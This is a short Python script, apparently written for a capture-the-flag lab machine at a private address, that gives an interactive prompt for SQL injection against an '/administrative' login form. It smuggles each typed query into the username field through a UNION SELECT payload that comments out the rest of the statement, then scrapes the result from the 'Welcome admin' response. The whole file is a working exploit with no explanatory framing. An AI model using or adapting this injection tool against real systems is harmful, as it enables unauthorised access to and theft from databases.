import requests as rq
import readline

url = 'http://10.10.11.101/administrative'

def query(cmd):
  data = {
    'uname': f'''admin' UNION SELECT NULL,({cmd}),NULL,NULL,NULL,NULL-- -''',
    'password': 'password'
  }
  res = rq.post(url, data=data).text
  start = res.find('Welcome admin')+len('Welcome admin')
  end = start + res[start:].find('</h3>')
  output = res[start:end]
  print(output)

while True:
  cmd = input('SQL query> ')
  if cmd == 'exit':
    exit(0)
  query(cmd)
